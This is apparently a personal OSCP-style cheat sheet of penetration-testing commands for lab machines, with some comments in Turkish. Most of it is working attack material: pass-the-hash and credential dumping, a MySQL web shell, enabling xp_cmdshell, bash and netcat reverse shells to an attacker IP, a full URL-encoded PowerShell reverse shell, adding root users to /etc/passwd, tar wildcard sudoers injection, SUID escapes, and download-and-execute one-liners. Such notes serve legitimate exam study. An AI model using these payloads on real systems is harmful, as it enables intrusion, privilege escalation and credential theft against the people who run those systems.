===================================IMPACKET================================
# Authenticated Access (SMB/WMI/PSExec)
# Example: impacket-psexec Sams-PC/Administrator:SeriousSAM14@192.168.54.248
impacket-psexec DOMAIN/user:password@10.10.10.10
impacket-wmiexec DOMAIN/user:password@10.10.10.10
impacket-secretsdump DOMAIN/user:password@10.10.10.10

# Pass-the-Hash
impacket-psexec -hashes :NT_HASH DOMAIN/user@10.10.10.10

# AD Enumeration
impacket-lookupsid DOMAIN/user:password@10.10.10.10
impacket-GetNPUsers [DOMAIN]/ -usersfile users.txt -no-pass -dc-ip [DC_IP] -request
kerbrute userenum -d [DOMAIN] --dc [DC_IP] [USERLIST]

# LSASS Minidump Analysis (pypykatz)
pypykatz lsa minidump lsass.DMP

# Non-Interactive Enumeration
# smbmap -H 10.10.10.10 -u user -p password (List shares)
# smbmap -H 10.10.10.10 -u user -p password -R [SHARE] (Recursive list)

# SMB Share Access (Interactive)
# smbclient //10.10.10.10/[SHARE] -U 'DOMAIN/user%password'
# get [FILE] / put [FILE]

==========================================================================

==================================SQL=====================================
# MySQL / MariaDB (RCE & EXFIL)
mysql -u root -p

-- Initial Setup (Schlix/WordPress pattern)
CREATE DATABASE schlix_db;
CREATE USER 'Hacked'@'%' IDENTIFIED BY 'Hacked';
GRANT ALL PRIVILEGES ON *.* TO 'Hacked'@'%';
FLUSH PRIVILEGES;

-- 1. Check for File Permissions
SELECT user, host, file_priv FROM mysql.user WHERE user = 'root';
SHOW VARIABLES LIKE "secure_file_priv"; 
-- If empty/NULL -> Writable. If path -> Only that path.

-- 2. Web Shell Injection
-- Path: Find via phpinfo() or default (C:/wamp64/www/, /var/www/html/)
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE 'C:/wamp64/www/shell.php';

-- 3. File Read (Exfil)
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('C:/windows/win.ini');

# MSSQL (EXECUTION & ESCALATION)
impacket-mssqlclient 'DOMAIN/user':'password'@10.10.10.10 -windows-auth

-- 1. Enable xp_cmdshell (The manual bypass)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
xp_cmdshell 'whoami';

-- 2. Database Impersonation (Escalate to SA)
-- Find users we can impersonate:
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
-- Execute as user:
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER; -- Verify we are sa

-- 3. Linked Servers (Find other DBs)
EXEC sp_linkedservers;
-- Execute on linked server:
EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER];

# Spring Boot RCE (Apache Commons Text)
# Vulnerability: ${script:javascript:...}
# Payload: ${script:javascript:java.lang.Runtime.getRuntime().exec('nc [KALI_IP] [PORT] -e /bin/bash')}

# JDWP (Java Debug Wire Protocol) Privilege Escalation
# 1. Identify: `ps aux | grep java` -> Check for `-Xdebug` and `address=[PORT]` (Default 8000).
# 2. Port Forward: If bound to localhost, use Chisel.
# 3. Exploit: `python2 jdwp-shellifier.py -t 127.0.0.1 -p 8000 --break-on "java.net.ServerSocket.accept" --cmd "[CMD]"`
# 4. Trigger: `curl http://127.0.0.1:8080` (Must wake up the JVM).

# Port Forwarding (Chisel)
# Kali (Server): `./chisel server -p [PORT] --reverse`
# Victim (Client - Reverse Local): `./chisel client [KALI_IP]:[PORT] R:[LOCAL_BIND_PORT]:127.0.0.1:[REMOTE_PORT]`
# Example: `./chisel client [KALI_IP]:9999 R:8000:127.0.0.1:8000` (Bridges victim's 8000 to Kali's 8000).

# FreeSWITCH RCE (Port 8021)
# Default Password: `ClueCon`
# Exploit: `python3 freeexp.py [TARGET_IP] "[COMMAND]"`
# Note: Use certutil via exploit to drop tools (nc64.exe, etc).

# Windows Privilege Escalation (Potatoes)
# SeImpersonatePrivilege -> System
# 1. PrintSpoofer: Fast, reliable for Win 10/Server 2016-2019.
# 2. GodPotato: Secondary choice if PrintSpoofer fails/timeouts.
# Command: `GodPotato.exe -cmd "[CMD]"`

==========================================================================
# PostgreSQL (RCE via COPY)
-- Must be superuser
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;

==========================================================================

==================================LINUX PRIV ESC==========================
# Stabilization
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Initial Checks
sudo -l 

# Writable /etc/passwd (Add Root User)
# 1. Generate hash: openssl passwd -1 password
# 2. Append to passwd: echo 'root2:[HASH]:0:0:root:/root:/bin/bash' >> /etc/passwd
# Example (Vegeta1): echo 'root2:$1$MWFqbDKv$RwuPM3tCfwpD7Kckcl4Ea/:0:0:root:/root:/bin/bash' >> /etc/passwd
# Alternative: echo "Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd
# 3. Use: su root2 (Pass: password) or su Tom (Pass: Password@973)

# Sudo Path Traversal (Cooperative Tactic)
# Scenario: Sudo rule contains relative paths. One user "prepares" the payload, another "triggers" it.
# Example (Seppuku): User `samurai` has sudo for `/../../../../../../home/tanto/.cgi_bin/bin`.
# Exploitation:
# 1. As `tanto`: Create the path and payload:
#    mkdir -p /home/tanto/.cgi_bin && echo "/bin/bash" > /home/tanto/.cgi_bin/bin && chmod +x /home/tanto/.cgi_bin/bin
# 2. As `samurai`: Execute the sudo command:
#    sudo /../../../../../../home/tanto/.cgi_bin/bin /tmp/any

# SUID PATH Hijacking (Relative Path Vulnerability)
# Scenario: SUID binary calls a command without an absolute path (e.g. `system("echo foo")`).
# 1. Identify: `strings [BINARY]` and look for missing absolute paths.
# 2. C Payload (Bypass shell privilege dropping):
#    #include <unistd.h>
#    int main() { setresuid(0,0,0); system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"); return 0; }
# 3. Compile: `gcc payload.c -o echo`
# 4. Hijack: `export PATH=/tmp/mybin:$PATH`
# 5. Run: `./vulnerable_binary` then `/tmp/rootbash -p`

# Windows SeImpersonatePrivilege Escalation
# Scenario: Service account or low-priv user has `SeImpersonate` (check with `whoami /priv`).
# Method A (PrintSpoofer): Best for newer systems/named pipes.
# .\PrintSpoofer.exe -i -c cmd
# Method B (GodPotato): Modern alternative for newer Windows builds.
# .\GodPotato-NET4.exe -cmd "whoami"
# Method C (JuicyPotato): Better for older systems (pre-Win10 1809).

# Internal Tool Relay (IIS Trick - MS01/OSCPB)
# Scenario: Target (MS02) is isolated, but you have SYSTEM on MS01 (IIS).
# 1. As MS01 SYSTEM: `copy shell.exe C:\inetpub\wwwroot\s.exe`
# 2. As MS02: `powershell -c "iwr http://[MS01_IP]:8000/s.exe -outf C:\Temp\s.exe"`
# Note: Default ports for IIS are often 80, 8000, 8080.

# World-Writable Script (Cronjob)
# Indicator: Finding high-permission scripts (-rwxrwxrwx) in user homes or /usr/local/bin.
# Check for usage: grep -r "scriptname" /etc/cron* /etc/crontab
# Exploitation (Persistence + Shell): 
# echo "cp -f /bin/bash /tmp/bash && chmod u+s /tmp/bash" >> [SCRIPT]
# echo "bash -i >& /dev/tcp/[KALI_IP]/[PORT] 0>&1" >> [SCRIPT]
# Note (Funbox): Sometimes crons are triggered by different users (e.g. funny AND root) at different times. Wait for the root trigger.

# MSSQL xp_cmdshell Escalation
# Scenario: You have `sysadmin` role (check: `SELECT is_srvrolemember('sysadmin')`).
# 1. Enable: `EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;`
# 2. Run: `EXEC xp_cmdshell 'whoami /priv';`
# 3. Pivot: If `SeImpersonate` is enabled, use PrintSpoofer/GodPotato through xp_cmdshell.

# Tar Wildcard Injection (Cron/Root)
# Scenario: root runs `tar czf backup.tar.gz *` in a user-writable directory.
# Method A (Sudoers): 
# echo 'echo "[USER] ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > shell.sh
# touch ./\--checkpoint=1
# touch ./\--checkpoint-action=exec=sh\ shell.sh
# Method B (SSH Key):
# echo 'cp /home/[USER]/.ssh/authorized_keys /root/.ssh/authorized_keys' > getroot.sh
# touch ./\--checkpoint=1
# touch ./\--checkpoint-action=exec=sh\ getroot.sh

# Config & Secret Hunting
cat /var/www/html/wordpress/wp-config.php

# SUID: Vi
:set shell=/bin/bash
:shell

# SUID: Teehee (Append to /etc/passwd)
echo "toor::0:0:root:/root:/bin/bash" | sudo /usr/bin/teehee -a /etc/passwd

# SUID: Git
sudo git help config
!/bin/bash

# SUID: Find
find . -exec /bin/sh \; -quit

# SUID: GDB (Python Core)
gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit

# SUID: GIMP (Python Core)
gimp-2.10 -idf --batch-interpreter python-fu-eval -b 'import os; os.execl("/bin/sh", "sh", "-p")'

# SUID: Nmap (NSE Exploit)
cat > /tmp/root.nse << 'EOF'
local os = require "os"
prerule = function() return true end
action = function() os.execute("/bin/bash") end
EOF
sudo nmap --script=/tmp/root.nse 127.0.0.1

# Capabilities (Python)
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# User Creation (Manual SHA-512)
# Generate: openssl passwd -1 -salt salt password
echo 'toor:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0::/root:/bin/bash' >> /etc/passwd

# Screen 4.5.0 (Vulnerability Trigger)
cat /tmp/malicious | /usr/bin/screen-4.5.0 -D -m -L ld.so.preload tee

==========================================================================

==================================WINDOWS PRIV ESC========================
# SeImpersonate (PrintSpoofer)
PrintSpoofer.exe -i -c "powershell -nop -c [Payload]"
GodPotato.exe -cmd "rev_shell_cmd"

# Web Shell Exploitation (SYSTEM Reverse Shell)
# Example: curl "http://[IP]/shell.php?cmd=C:%5Ctmp%5CPrintSpoofer.exe%20-i%20-c%20%22powershell%20-nop%20-c%20%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27[KALI_IP]%27%2C4444%29..."
curl "http://192.168.163.141/shell.php?cmd=C:%5Ctmp%5CPrintSpoofer.exe%20-i%20-c%20%22powershell%20-nop%20-c%20%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27192.168.45.209%27%2C4444%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22"

# DPAPI Cracking
powershell -c "[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\path\to\masterkey'))"
mimikatz "dpapi::cred /in:C:\path\to\creds /masterkey:[HEX]"

# Backup Recovery (NTDS / SAM / SYSTEM)
# Option A: Check for C:\windows.old (Offline Dump)
# 1. Locate hives: C:\windows.old\Windows\System32\config
# 2. Extract:
#    (from Evil-WinRM): download SAM; download SYSTEM
# 3. Dump hashes on Kali:
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# Option B: wbadmin (Backup Operators)
echo "Y" | wbadmin start backup -backuptarget:\\10.10.15.244\smb -include:c:\windows\ntds
# Option C: SeBackupPrivilege (reg save)
reg save hklm\sam SAM
reg save hklm\system SYSTEM

# Registry Secrets (PuTTY/AutoLogon)
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions\zachary"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

==========================================================================

==================================GIT & FORENSICS=========================
# Git Dumper
git-dumper http://[IP]/.git/ .git

# History Hunting
git log -p --all
git show [HASH]

# Branch Size Triage (Spot the JUICY branch)
cd .git/logs/refs/heads
ls -lna | sort -n -r

# History & Forensics
cat /home/*/.bash_history
cat ~/.viminfo | grep -A 5 "Search String History"

==========================================================================

==================================FILE TRANSFER===========================
# Kali Listener
python3 -m http.server 8000

# Linux Download & Execute
# Example: wget http://192.168.45.214:8000/test.c
wget http://[IP]:8000/file
curl http://[IP]:8000/file -o file

# Compile (Static for compatibility)
# Example: gcc test.c -o exploit
gcc test.c -o exploit -static

# Windows Download
certutil.exe -urlcache -f http://[IP]:8000/file file.exe
iwr -uri http://[IP]:8000/file -outf file.exe

==========================================================================

==================================MISC TRICKS=============================
# WiFi Mouse FIX (Original Exploit Timing Fix)
# Use 0.1s delay between characters in SendString
# Use %TEMP% instead of C:\Windows\Temp

# Port Knocking (Automatic Loop)
for x in 7469 8475 9842; do nmap -Pn --host-timeout 201 --max-retries 0 -p $x [IP]; done

# Memcached (Stats Dumping)
telnet [IP] 11211
stats items
stats cachedump [ID] [LIMIT]

# WordPress (Plugin RCE)
# Zip modified plugin with reverse shell -> Upload via /wp-admin/plugin-install.php

# wpDiscuz (Unauthenticated RCE - CVE-2020-24186)
# Vulnerable up to 7.0.4. Manual check: search source for /wpdiscuz/style.css?ver=7.0.4
# Exploitation: python3 wpdiscuz.py -u "[URL]" -p "/?p=[POST_ID]"
# Example (Blogger): python3 wpdiscuz.py -u "http://blogger.pg/assets/fonts/blog" -p "/?p=29"
# Working Shell: curl -G "http://blogger.pg/[PATH]/[SHELL].php" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/[KALI_IP]/[PORT] 0>&1'"

# WP Enumeration Tips (The "Blogger" Lesson)
# 1. If wpscan says "No plugins", check page source for styles/scripts in wp-content/plugins/.
# 2. Try aggressive detection:
#    wpscan --url [URL] --enumerate vp --plugins-detection aggressive
# 3. Check for specific post IDs or feeds if the homepage is a generic landing page.
# 4. Wordlists: If standard lists fail, use the lowercase version (Crucial for machines like Kiero):
#    /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

# DNS/UDP Enumeration (SNMP)
# Community String: 'public' (Default)
# Commands:
# 1. Scan: `nmap -sU --top-ports 100 [IP]`
# 2. Check: `snmp-check [IP] -c public`
# 3. Walk: `snmpwalk -v2c -c public [IP]`

# RID Brute Forcing (User Enumeration):
# Command: wpscan --url [URL] -U [USER] -P [WORDLIST]
# Command (Batch): wpscan --url [URL] --enumerate u --passwords [WORDLIST]

# Steganography / Decoding
# QR Code: sudo apt install zbar-tools -> zbarimg [file.png]
# Morse in Audio: morse2ascii [file.wav]
# Morse Visual: Spectrogram -> Look for . (dots) and - (dashes)
# Wordlists: If standard fails, try lowercase: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

# Unshadowing & Hash Cracking
# Command: unshadow [PASSWD_FILE] [SHADOW_FILE] > [OUTFILE]
# Crack: john --wordlist=[LIST] [OUTFILE]
# Example (Seppuku): unshadow passwd.bak shadow.bak > crack_me.txt

# Restricted Shell (rbash) Escape
- **SSH Command Injection**: `ssh [user]@[IP] -t "bash --noprofile"`
- **Vi/Vim Escape**:
  1. `:set shell=/bin/bash`
  2. `:shell`
- **CP Escape (Writable Scripts)**: If you can write to a script called by root/cron, use it to copy `/bin/bash` or inject keys.
- **Path Fix**: Once escaped, fix the PATH: `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`

# SSH / Auth Injection
# SSH Key Injection via File Upload:
# curl -X POST http://[IP]/upload -F "file=@/path/id_rsa.pub" -F "filename=/home/[USER]/.ssh/authorized_keys"


# ================================================================
# OSCP EXPLOIT DEVELOPMENT & DEBUGGING CHEAT SHEET (PY2 vs PY3)
# ================================================================

# --- 1. DEĞİŞKEN GÖMME (STRING FORMATTING) ---
# Python 2'de f"..." YOKTUR! SyntaxError alırsın. En garantisi %s kullanımıdır.
# PY2: cmd = "curl http://%s/s.exe" % lhost
# PY3: cmd = f"curl http://{lhost}/s.exe"

# --- 2. WINDOWS DOSYA YOLLARI (ESCAPE CHARACTERS) ---
# Ters slaşlar (\) her zaman r"..." (Raw String) içine yazılmalıdır.
# NEDEN: r koymazsan \T veya \U gibi ifadeler bozulur, shell gelmez.
# HER İKİSİ: path = r"C:\Windows\Temp\shell.exe"

# --- 3. HEX ENCODING (KOMUTU PAKETE GÖMME) ---
# PY2: hex_cmd = cmd.encode('hex')
# PY3: hex_cmd = cmd.encode().hex()

# --- 4. VERİ GÖNDERME (SOCKET SEND) ---
# Python 3 soketleri sadece 'bytes' kabul eder, string kabul etmez.
# PY2: s.send("A" * 100)
# PY3: s.send(b"A" * 100) veya s.send(cmd.encode())

# --- 5. UZUN KOMUTLARI BÖLME (SYNTAX ERROR ÖNLEYİCİ) ---
# Metni tırnağı kapatmadan alt satıra indirme! Parantez kullan:
# HER İKİSİ:
# cmd = ("powershell -c \"IEX (New-Object Net.WebClient)."
#        "DownloadString('http://%s/s.ps1')\"" % lhost)

# --- 6. HATA AYIKLAMA (DEBUGGING) ---
# Eğer shell gelmiyorsa gönderdiğin şeyi mutlaka ekrana bas:
# PY2: print "Gonderilen: " + cmd
# PY3: print(f"Gonderilen: {cmd}")

# ================================================================
# SINAV TAKTİĞİ:
# 1. 'python --version' yaz. 2.7 ise f-string kullanma, print'e parantez koyma.
# 2. 'shell gelmiyorsa' python server loguna bak. 200 OK yoksa IP yanlıştır.
# 3. '200 OK var ama shell yoksa' Windows Defender silmiştir, PowerShell dene.
# ================================================================

buda bizim genel notlar
